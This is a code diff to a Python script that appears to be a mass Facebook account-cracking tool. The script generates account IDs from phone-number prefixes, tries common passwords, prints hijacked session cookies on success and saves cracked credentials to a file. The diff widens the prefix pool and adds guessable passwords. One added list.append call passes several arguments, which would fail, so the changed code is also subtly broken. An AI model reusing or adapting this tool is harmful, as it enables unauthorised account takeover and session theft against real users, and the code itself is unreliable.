@@ -137,13 +137,16 @@ def xxr():
     os.geteuid
     os.system("clear")
     print(logo)
-    print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
+    #print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
     print(" ══════════════════════════════════════════")
     rk1 = '0191'
     rk2 = '0192'
     rk3 = '0195'
     rk4 = '019'
-    code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
+    rk = '017'
+    rk2 = '016'
+    rk3 = '018'
+    code = random.choice([rk1,rk2,rk3,rk,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
     os.system('clear')
     print(logo)
     limit = int(input(' \033[97;1m[\033[92;1m✓\033[97;1m]\033[1;97mEXAMPLE    \033[38;5;196m: \033[1;35m1000\033[1;97m/\033[1;34m2000\033[1;97m/\033[1;32m3000\n \033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \n \033[97;1m[\033[92;1m?\033[97;1m]\033[1;97mCRACK LIMIT \033[38;5;196m:\033[97;1m '))  
@@ -173,7 +176,7 @@ def xxr():
             uid = code+love
             for Eman in HamiiID:
                 pwx.append(Eman)
-                pwx.append(love)
+                pwx.append(love, 'bangladesh','BANGLADESH','@#@#@#',)
             manshera.submit(rcrack,uid,pwx,tl)
     print(f"\n{x} ══════════════════════════════════════════")
 def rcrack(uid,pwx,tl):
@@ -218,7 +221,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('\r\r\033[1;32m[NAYANOK💥] ' +uid+ ' | ' +ps+    '  \n[‎‎💣]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+                print('\r\r\033[1;32m[NAYANOK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/NAYAN-OK.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(cid)
